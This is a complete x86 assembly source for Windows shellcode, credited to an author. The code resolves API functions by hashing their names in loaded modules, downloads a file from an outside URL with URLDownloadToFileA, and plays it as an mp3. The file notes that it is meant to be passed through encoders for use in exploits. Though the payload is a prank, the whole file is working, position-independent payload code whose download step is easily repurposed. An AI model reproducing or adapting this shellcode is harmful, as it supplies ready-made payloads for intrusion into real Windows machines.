; Windows shellcode to download and play an mp3.
; 528 bytes, null bytes all over the place. Intended for use with encoders.
; Works on Windows 7, designed for compatibility for XP and up. Untested on XP.
;
; frank2 <frank2 [R] dc949 [A] org>
   
      global main

_main:
      jmp   dataOffset

getFuncByHash:
      mov   esi,[esp+8]
      mov   edi,[esi+0x3C]       ; dos->e_lfanew 
      add   edi,esi
      mov   ecx,[edi+0x78]       ; export data 
      add   ecx,esi
      mov   ebx,[ecx+0x20]       ; AddressOfNames 
      add   ebx,esi
      xor   eax,eax
      push  ecx

searchForFunc:
      mov   edx,[ebx+eax*4]
      add   edx,esi
      mov   edi,0x554E4441       ; ADNU

hashString:
      movzx ecx,byte [edx]
      test  ecx,ecx
      jz    short finishHash

rolRolFightDaPowa:
      xor   edi,ecx
      rol   edi,cl
      shr   ecx,1
      jnz   short rolRolFightDaPowa
      inc   edx
      jmp   short hashString

finishHash:
      or    edi,0x10101010
      cmp   edi,[esp+8]
      jz    short foundHash
      inc   eax
      jmp   short searchForFunc

foundHash:
      pop   ebx
      mov   edi,[ebx+0x1c]
      add   edi,esi
      mov   ebx,[ebx+0x24]
      add   ebx,esi
      movzx ebx,word [ebx+eax*2]
      mov   ebx,[edi+ebx*4]
      add   ebx,esi
      pop   eax                        ; fix the stack 
      pop   edx
      pop   edx
      push  eax
      ret   

beginCode:
      pop   ebp
      xor   eax,eax
      xor   ebx,ebx
      xor   ecx,ecx
      mov   cx,520
      mov   bl,144
      lea   edi,[ebp+ebx]
      repne stosb
      mov   esi,[fs:ecx+0x30]
      mov   esi,[esi+0xC]
      mov   esi,[esi+0xC]
      mov   esi,[esi]
      push  dword [esi+0x18]     ; ntdll, just in case. 
      mov   esi,[esi]
      push  dword [esi+0x18]     ; kernel32 
      push  dword [esp]
      push  dword [ebp]
      call  getFuncByHash
      cmp   dword [ebx],0x4C44544E
      jnz   hasExitThread
      push  dword [esp+4]
      push  dword [ebp+4]
      call  getFuncByHash

hasExitThread:
      mov   [ebp],ebx            ; RtlExitUserThread 

      push  dword [esp]
      push  dword [ebp+8]
      call  getFuncByHash
      mov   [ebp+8],ebx          ; LoadLibraryA 

      push  dword [esp]
      push  dword [ebp+0xC]
      call  getFuncByHash
      mov   [ebp+0xC],ebx        ; GetTempPathA 

      push  dword [esp]
      push  dword [ebp+0x10]
      call  getFuncByHash
      mov   [ebp+0x10],ebx       ; Sleep 

      lea   eax,[ebp+32]
      push  eax
      call  [ebp+8]              ; urlmon.dll 
      push  eax
      push  dword [ebp+0x14]
      call  getFuncByHash
      mov   [ebp+0x14],ebx        ; URLDownloadToFileA 

      lea   eax,[ebp+43]
      push  eax
      call  [ebp+8]              ; winmm.dll 
      push  eax
      push  dword [ebp+0x18]
      call  getFuncByHash
      mov   [ebp+0x18],ebx       ; mciSendString 

      lea   eax,[ebp+53]
      push  eax
      call  [ebp+8]              ; msvcrt.dll 
      push  eax
      push  dword [ebp+0x1C]
      call  getFuncByHash
      mov   [ebp+0x1C],ebx       ; sprintf 

      push  ecx
      push  ecx
      push  ecx
      lea   eax,[ebp+410]
      push  eax
      lea   edi,[ebp+150]
      push  edi
      push  edi
      mov   cx,520
      push  ecx
      call  [ebp+0xC]            ; GetTempPathA 
      add   edi,eax
      lea   esi,[ebp+90]

copyLoop:
      movzx ecx,byte [esi]
      mov   byte [edi],cl
      inc   edi
      inc   esi
      test  ecx,ecx
      jnz   short copyLoop  

      push  ecx
      push  ecx
      push  dword [esp+8]
      lea   eax,[ebp+64]
      push  eax
      push  ecx
      call  [ebp+0x14]            ; URLDownloadToFileA 

      lea   edx,[ebp+96]
      push  edx
      push  dword [esp+8] 
      call  [ebp+0x1C]           ; sprintf 
      add   esp,0xC
      mov   esi,[ebp+0x18]
      call  esi                  ; mciSendString 

      push  eax
      push  eax
      push  eax
      lea   eax,[ebp+129]
      push  eax
      call  esi

      push  100000               ; change this as necessary 
      call  [ebp+0x10]           ; Sleep 

      xor   eax,eax
      push  eax
      push  eax
      push  eax
      lea   eax,[ebp+136]
      push  eax
      call  esi

      push  eax
      call  [ebp]             ; ExitThread/RtlExitUserThread 

dataOffset:
      call  beginCode

      dd    0x58159F36        ; ExitThread
      dd    0x795D941E        ; RtlExitUserThread
      dd    0xF816FF93        ; LoadLibraryA
      dd    0x1A9CB85B        ; GetTempPathA
      dd    0xF57E76B5        ; Sleep
      dd    0xDE59B5BE        ; URLDownloadToFileA
      dd    0x337C36DF        ; mciSendStringA
      dd    0xB7DFF73D        ; sprintf
      db    'urlmon.dll',0
      db    'winmm.dll',0
      db    'msvcrt.dll',0
      db    'http://never-unpacked.net/a.mp3',0
      db    'open "%s" type mpegvideo alias m',0
      db    'play m',0
      db    'stop m',0
